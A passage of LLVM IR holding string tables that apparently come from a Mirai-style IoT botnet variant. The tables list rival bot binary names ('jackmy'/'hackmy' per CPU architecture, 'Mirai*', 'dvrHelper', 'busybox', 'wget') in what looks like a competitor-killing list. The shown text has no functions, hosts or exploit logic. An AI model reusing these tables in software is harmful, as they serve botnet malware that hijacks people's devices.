i8], [13 x i8]* @.str.269, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.270, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.271, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.272, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.273, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.274, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.275, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.276, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.277, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.278, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.279, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.280, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.281, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.282, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.283, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.284, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.285, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.286, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.287, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.288, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.289, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.290, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.291, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.292, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.293, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.294, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.295, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.296, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.297, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.298, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.299, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.300, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.301, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.302, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.303, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.304, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.305, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.306, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.307, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.308, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.309, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.311, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.312, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.313, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.314, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.315, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.316, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.317, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.318, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.319, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.320, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.321, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.322, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.323, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.324, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.325, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.326, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.327, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.328, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.329, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.330, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.331, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.332, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.333, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.334, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.335, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.336, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.337, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.338, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.339, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.340, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.341, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.342, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.343, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.344, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.345, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.346, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.347, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.348, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.349, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.350, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.351, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.352, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.353, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.354, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.355, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.356, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.357, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.358, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.359, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.360, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.361, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.362, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.363, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.364, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.365, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.366, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.367, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.368, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.369, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.370, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.371, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.372, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.373, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.374, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.375, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.376, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.377, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.378, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.379, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.380, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.381, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.382, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.383, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.384, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.385, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.386, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.387, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.388, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.389, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.390, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.391, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.392, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.393, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.394, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.395, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.396, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.397, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.398, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.399, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.400, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.401, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.402, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.403, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.404, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.405, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.406, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.407, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.408, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.409, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.410, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.411, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.412, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.413, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.414, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.415, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.416, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.417, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.418, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.419, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.420, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.421, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.422, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.423, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.424, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.425, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.426, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.427, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.428, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.429, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.430, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.431, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.432, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.433, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.256, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.257, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.258, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.259, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.260, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.261, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.262, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.434, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.263, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.264, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.343, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.435, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.436, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.437, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.438, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.439, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.440, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.441, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.442, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.443, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.444, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.445, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.446, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.447, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.448, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.449, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.450, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.451, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.452, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.453, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.454, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.455, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.456, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.457, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.458, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.459, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.460, i32 0, i32 0)], align 16
@.str.179 = private unnamed_addr constant [10 x i8] c"amsjkfbns\00", align 1
@.str.180 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.181 = private unnamed_addr constant [9 x i8] c"xdf.mips\00", align 1
@.str.182 = private unnamed_addr constant [6 x i8] c"xdf.*\00", align 1
@.str.183 = private unnamed_addr constant [5 x i8] c"xdf*\00", align 1
@.str.184 = private unnamed_addr constant [11 x i8] c"xdf.mipsel\00", align 1
@.str.185 = private unnamed_addr constant [11 x i8] c"xdf.x86_64\00", align 1
@.str.186 = private unnamed_addr constant [9 x i8] c"xdf.arm7\00", align 1
@.str.187 = private unnamed_addr constant [8 x i8] c"xdf.ppc\00", align 1
@.str.188 = private unnamed_addr constant [8 x i8] c"xdf.sh4\00", align 1
@.str.189 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.190 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.191 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.192 = private unnamed_addr constant [5 x i8] c"i686\00", align 1
@.str.193 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.194 = private unnamed_addr constant [5 x i8] c"i586\00", align 1
@.str.195 = private unnamed_addr constant [6 x i8] c"jack*\00", align 1
@.str.196 = private unnamed_addr constant [6 x i8] c"hack*\00", align 1
@.str.197 = private unnamed_addr constant [11 x i8] c"arm*tel*b1\00", align 1
@.str.198 = private unnamed_addr constant [3 x i8] c"b2\00", align 1
@.str.199 = private unnamed_addr constant [3 x i8] c"b3\00", align 1
@.str.200 = private unnamed_addr constant [3 x i8] c"b4\00", align 1
@.str.201 = private unnamed_addr constant [3 x i8] c"b5\00", align 1
@.str.202 = private unnamed_addr constant [3 x i8] c"b6\00", align 1
@.str.203 = private unnamed_addr constant [3 x i8] c"b7\00", align 1
@.str.204 = private unnamed_addr constant [3 x i8] c"b8\00", align 1
@.str.205 = private unnamed_addr constant [3 x i8] c"b9\00", align 1
@.str.206 = private unnamed_addr constant [5 x i8] c"wget\00", align 1
@.str.207 = private unnamed_addr constant [6 x i8] c"orion\00", align 1
@.str.208 = private unnamed_addr constant [5 x i8] c"lol*\00", align 1
@.str.209 = private unnamed_addr constant [9 x i8] c"busybox*\00", align 1
@.str.210 = private unnamed_addr constant [8 x i8] c"badbox*\00", align 1
@.str.211 = private unnamed_addr constant [9 x i8] c"DFhxdhdf\00", align 1
@.str.212 = private unnamed_addr constant [10 x i8] c"dvrHelper\00", align 1
@.str.213 = private unnamed_addr constant [8 x i8] c"FDFDHFC\00", align 1
@.str.214 = private unnamed_addr constant [5 x i8] c"FEUB\00", align 1
@.str.215 = private unnamed_addr constant [9 x i8] c"FTUdftui\00", align 1
@.str.216 = private unnamed_addr constant [9 x i8] c"GHfjfgvj\00", align 1
@.str.217 = private unnamed_addr constant [6 x i8] c"jhUOH\00", align 1
@.str.218 = private unnamed_addr constant [9 x i8] c"JIPJIPJj\00", align 1
@.str.219 = private unnamed_addr constant [10 x i8] c"JIPJuipjh\00", align 1
@.str.220 = private unnamed_addr constant [10 x i8] c"kmyx86_64\00", align 1
@.str.221 = private unnamed_addr constant [10 x i8] c"lolmipsel\00", align 1
@.str.222 = private unnamed_addr constant [8 x i8] c"RYrydry\00", align 1
@.str.223 = private unnamed_addr constant [9 x i8] c"TwoFace*\00", align 1
@.str.224 = private unnamed_addr constant [9 x i8] c"UYyuyioy\00", align 1
@.str = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.225 = private unnamed_addr constant [9 x i8] c"XDzdfxzf\00", align 1
@.str.226 = private unnamed_addr constant [4 x i8] c"xx*\00", align 1
@.str.227 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.228 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.229 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.230 = private unnamed_addr constant [2 x i8] c"3\00", align 1
@.str.231 = private unnamed_addr constant [2 x i8] c"4\00", align 1
@.str.232 = private unnamed_addr constant [2 x i8] c"5\00", align 1
@.str.233 = private unnamed_addr constant [2 x i8] c"6\00", align 1
@.str.234 = private unnamed_addr constant [2 x i8] c"7\00", align 1
@.str.235 = private unnamed_addr constant [2 x i8] c"8\00", align 1
@.str.236 = private unnamed_addr constant [2 x i8] c"9\00", align 1
@.str.237 = private unnamed_addr constant [3 x i8] c"10\00", align 1
@.str.238 = private unnamed_addr constant [3 x i8] c"11\00", align 1
@.str.239 = private unnamed_addr constant [3 x i8] c"12\00", align 1
@.str.240 = private unnamed_addr constant [3 x i8] c"13\00", align 1
@.str.241 = private unnamed_addr constant [3 x i8] c"14\00", align 1
@.str.242 = private unnamed_addr constant [3 x i8] c"15\00", align 1
@.str.243 = private unnamed_addr constant [3 x i8] c"16\00", align 1
@.str.244 = private unnamed_addr constant [3 x i8] c"17\00", align 1
@.str.245 = private unnamed_addr constant [3 x i8] c"18\00", align 1
@.str.246 = private unnamed_addr constant [3 x i8] c"19\00", align 1
@.str.247 = private unnamed_addr constant [3 x i8] c"20\00", align 1
@.str.248 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.249 = private unnamed_addr constant [7 x i8] c"badbox\00", align 1
@.str.250 = private unnamed_addr constant [7 x i8] c"Mirai*\00", align 1
@.str.251 = private unnamed_addr constant [7 x i8] c"mirai*\00", align 1
@.str.252 = private unnamed_addr constant [11 x i8] c"cunty*IoT*\00", align 1
@.str.253 = private unnamed_addr constant [7 x i8] c"mips64\00", align 1
@.str.254 = private unnamed_addr constant [6 x i8] c"sh2eb\00", align 1
@.str.255 = private unnamed_addr constant [7 x i8] c"sh2elf\00", align 1
@.str.256 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.257 = private unnamed_addr constant [6 x i8] c"armv5\00", align 1
@.str.258 = private unnamed_addr constant [8 x i8] c"armv4tl\00", align 1
@.str.259 = private unnamed_addr constant [6 x i8] c"armv4\00", align 1
@.str.260 = private unnamed_addr constant [6 x i8] c"armv6\00", align 1
@.str.261 = private unnamed_addr constant [8 x i8] c"powerpc\00", align 1
@.str.262 = private unnamed_addr constant [13 x i8] c"powerpc440fp\00", align 1
@.str.263 = private unnamed_addr constant [5 x i8] c"m68k\00", align 1
@.str.264 = private unnamed_addr constant [6 x i8] c"sparc\00", align 1
@.str.265 = private unnamed_addr constant [11 x i8] c"jackmymips\00", align 1
@.str.266 = private unnamed_addr constant [13 x i8] c"jackmymips64\00", align 1
@.str.267 = private unnamed_addr constant [13 x i8] c"jackmymipsel\00", align 1
@.str.268 = private unnamed_addr constant [12 x i8] c"jackmysh2eb\00", align 1
@.str.269 = private unnamed_addr constant [13 x i8] c"jackmysh2elf\00", align 1
@.str.270 = private unnamed_addr constant [10 x i8] c"jackmysh4\00", align 1
@.str.271 = private unnamed_addr constant [10 x i8] c"jackmyx86\00", align 1
@.str.272 = private unnamed_addr constant [12 x i8] c"jackmyarmv5\00", align 1
@.str.273 = private unnamed_addr constant [14 x i8] c"jackmyarmv4tl\00", align 1
@.str.274 = private unnamed_addr constant [12 x i8] c"jackmyarmv4\00", align 1
@.str.275 = private unnamed_addr constant [12 x i8] c"jackmyarmv6\00", align 1
@.str.276 = private unnamed_addr constant [11 x i8] c"jackmyi686\00", align 1
@.str.277 = private unnamed_addr constant [14 x i8] c"jackmypowerpc\00", align 1
@.str.278 = private unnamed_addr constant [19 x i8] c"jackmypowerpc440fp\00", align 1
@.str.279 = private unnamed_addr constant [11 x i8] c"jackmyi586\00", align 1
@.str.280 = private unnamed_addr constant [11 x i8] c"jackmym68k\00", align 1
@.str.281 = private unnamed_addr constant [12 x i8] c"jackmysparc\00", align 1
@.str.282 = private unnamed_addr constant [13 x i8] c"jackmyx86_64\00", align 1
@.str.283 = private unnamed_addr constant [11 x i8] c"hackmymips\00", align 1
@.str.284 = private unnamed_addr constant [13 x i8] c"hackmymips64\00", align 1
@.str.285 = private unnamed_addr constant [13 x i8] c"hackmymipsel\00", align 1
@.str.286 = private unnamed_addr constant [12 x i8] c"hackmysh2eb\00", align 1
@.str.287 = private unnamed_addr constant [13 x i8] c"hackmysh2elf\00", align 1
